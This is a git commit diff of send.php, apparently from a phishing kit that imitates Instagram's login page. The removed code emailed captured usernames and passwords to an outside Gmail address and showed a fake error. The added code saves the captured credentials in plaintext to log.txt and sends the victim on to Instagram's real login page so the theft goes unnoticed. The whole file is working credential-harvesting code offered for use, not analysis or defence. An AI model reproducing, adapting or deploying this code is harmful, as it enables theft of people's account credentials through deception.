3528f65399348dc1a5155c805cfa1166e239b373
security-check-portal <pikachuash467@gmail.com>
2026-06-20 23:57:13 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,26 +1,11 @@
 <?php
+$username = $_POST['username'];
+$password = $_POST['password'];
 
-// Variable settings
-$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
-$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
+$file = fopen("log.txt", "a");
+fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
+fclose($file);
 
-$subject = "Someone Login ! Insta Dummy page";
-$to = "sheityuman@gmail.com";
-
-$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
-
-// Check input fields
-if (!empty($username) and !empty($passcode)) {
-
-    mail($to, $subject, $txt);
-    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
-        </script>";
-
-} else {
-
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
-        window.history.go(-1);
-        </script>";
-}
+header("Location: https://www.instagram.com/accounts/login/");
+exit();
 ?>
